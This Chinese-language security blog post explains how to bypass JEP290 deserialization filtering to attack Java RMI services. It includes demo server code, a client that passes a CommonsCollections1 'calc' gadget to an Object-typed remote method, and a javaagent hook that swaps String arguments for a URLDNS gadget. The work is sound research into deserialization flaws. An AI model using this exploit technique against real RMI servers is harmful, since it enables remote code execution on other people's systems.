
# Bypass JEP290攻击rmi


                                阅读量   
                                **621192**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/200860/t01951df62dffe7a6b8.png)](./img/200860/t01951df62dffe7a6b8.png)



## 1、前言

上一篇文章jmx攻击利用方式，通过修改参数为gadget实现攻击，本文与上一篇原理很类似。在2月份的时候 0c0c0f师傅写的是动态替换rmi通讯时候函数参数的值，也就是老外实现的方法。本文借鉴外国的安全研究员的第二个思路，写了**Rasp hook InvokeRemoteMethod函数的代码修改为gadget。**



## 2、JEP290

**什么是JEP290？**

> <p>1、提供一个限制反序列化类的机制，白名单或者黑名单。<br>
2、限制反序列化的深度和复杂度。<br>
3、为RMI远程调用对象提供了一个验证类的机制。<br>
4、定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。</p>

简单来说，就是ysoserial中的所有gadget已经加入黑名单了，底层JDK实现的防御反序列化攻击，当然，如果在出现新的gadget也可以bypass JEP290，但是挖jdk gadget有多难，大家理解一下Jdk7u21和Jdk8u20两条gadget实现原理就知道有多难了。<br>**JEP290有哪些java版本支持？**

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019bf6041f515275dd.png)

如果，jdk版本在上图以下，攻击方式有俩种：

**1、可以通过RMIRegistryExploit攻击**

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_209_/t012efc51b537c70916.png)

**2、可以通过JRMPClient攻击**

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_99_/t01c9ec7aa091012179.png)

在上图jdk版本以上的ysoserial中的gadget是打不了的，RMIRegistryExploit和JRMPClient也被加入黑名单了，0c0c0f师傅已经测了，具体的看他写的文章：[https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg](https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg)



## 3、RMI反序列化bypass JEP290

废话不多bb，先给出rmi运行的Demo。<br>
RmiServer端代码，注册的两个函数afanti只能接收String类型参数，afnati1能接收Object 类型参数：

```
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
public class Server {
    public static void main(String[] args) throws Exception{
        Hello hello = new HelloImpl();
        LocateRegistry.createRegistry(1234);
        String url = "rmi://127.0.0.1:1234/Hello";
        Naming.bind(url, hello);
        System.out.println("rmi server is running ...");
    }
}
```

```
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Hello extends Remote {
    public String afanti(String msg) throws RemoteException;
    public void afanti2(Object msg) throws RemoteException;
}
```

```
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloImpl extends UnicastRemoteObject implements Hello {
    public HelloImpl() throws RemoteException {
        super();
    }

    public String afanti(String msg){
        System.out.println(msg);
        return msg;
    }
    public void afanti2(Object msg){
        System.out.println(msg.toString());
    }
}
```

RmiClient代码：

```
import RmiServer.Hello;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1234);
        Hello hello = ( Hello ) registry.lookup("Hello");
        hello.afanti("this is RMI SPEAKING");
    }
}
```

如果正常客户端调用afanti方法，运行就是如下结果：

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019b47de0377a94692.png)

改一下客户端代码，在afanti2注入gadget有什么效果呢？

```
import RmiServer.Hello;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1234);
        Hello hello = (Hello)registry.lookup("Hello");
        CommonsCollections1 cc1 = new CommonsCollections1();
        hello.afanti2(cc1.getObject("calc"));
        hello.afanti("this is RMI SPEAKING");
    }
}
```

效果就是这样，

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_507_/t018d4c792384fce1b2.png)

上面的第一种攻击方式也就是0c0c0f师傅说的：如果暴露的函数有对象类型参数，那么直接就可以利用，为什么能攻击成功呢？因为rmi是基于100%反序列化的。

rmi在反序列化时，会调用unmarshalValue方法判断类型参数，如果是非Object类型参数，那是打不成功的。

```
protected static Object unmarshalValue(Class&lt;?&gt; type, ObjectInput in)
        throws IOException, ClassNotFoundException
    {
        if (type.isPrimitive()) {
            if (type == int.class) {
                return Integer.valueOf(in.readInt());
            } else if (type == boolean.class) {
                return Boolean.valueOf(in.readBoolean());
            } else if (type == byte.class) {
                return Byte.valueOf(in.readByte());
            } else if (type == char.class) {
                return Character.valueOf(in.readChar());
            } else if (type == short.class) {
                return Short.valueOf(in.readShort());
            } else if (type == long.class) {
                return Long.valueOf(in.readLong());
            } else if (type == float.class) {
                return Float.valueOf(in.readFloat());
            } else if (type == double.class) {
                return Double.valueOf(in.readDouble());
            } else {
                throw new Error("Unrecognized primitive type: " + type);
            }
        } else {
            return in.readObject();
        }
}
```

大多数接口不提供接受任意对象作为参数的方法，怎么办呢？要知道攻击者可以完全控制客户端的，调试时正常的demo，invokeRemoteMethod的第三个参数是传入的值。

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_527_/t0111dcf18e2bdd229e.png)

因此可以用恶意对象替换从Object类派生的参数（例如String），所以就给出了bypass的思路如下：

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01deb73f43149c2a67.png)

实际0c0c0f师傅实现的方法就是通过实现代理来替换网络流上已经序列化的对象。本文尝试使用第三个方法。通过RASP hook住java.rmi.server.RemoteObjectInvocationHandler类的InvokeRemoteMethod方法的第三个参数非Object的改为Object的gadget。<br>
具体Rasp可以用下图来表示，RASP的知识，网上资料很多，这里就不赘述了：

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012a2a972f9343e45d.png)

这里gadget用的是URLDNS这条，下图是改参数的地方

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_274_/t016fa23498b9c87db4.png)

Hook invokeRemoteMethod函数，参考的最后一个raspdemo写的。

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_180_/t01856c7a91ee03cd8e.png)

客户端代码还是正常的demo

```
import RmiServer.Hello;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1234);
        Hello hello = ( Hello ) registry.lookup("Hello");
        hello.afanti("this is RMI SPEAKING");
    }
}
```

最后通过mvn package打包，运行RmiClient前，VM options参数填写`:-javaagent:C:UsersxxxRemoteObjectInvocationHandlertargetrasp-1.0-SNAPSHOT.jar`

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012d9f8e17db568fea.png)

下断在跟一下，InvokeRemoteMethod的第三个参数已经修改为URLDNS gadget。

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_592_/t01351f67f5a8515c4e.png)

控制台实际会触发`argument type mismatc`错误，但不影响执行反序列化操作，看DNS平台已经收到回显。

[![](./img/200860/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_333_/t017d886deffb4cd3db.png)

**最后放上代码的地址**：[https://github.com/Afant1/RemoteObjectInvocationHandler.git](https://github.com/Afant1/RemoteObjectInvocationHandler.git)



## 4、总结

**即使暴露的函数非Object参数类型的，也是可以被攻击的。**说起来攻防永远在转换过程中，即使出了防御机制，研究人员还是能找到bypass的点，期待什么时候java反序列化能够彻底杜绝。上面研究内容是之前研究的，说起来惭愧，最近没开学，在家整理文档，发现这个有意思的点，所以才发出来，看看有时间吗，可能在分享一些有意思的点。最后，文章写的难免有些疏漏，还请各位师傅斧正。

### <a class="reference-link" name="%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"></a>参考链接

[https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)<br>[https://openjdk.java.net/jeps/290](https://openjdk.java.net/jeps/290)<br>[https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg](https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg)<br>[https://xz.aliyun.com/t/1631](https://xz.aliyun.com/t/1631)<br>[https://github.com/linxin26/javarespdemo/](https://github.com/linxin26/javarespdemo/)
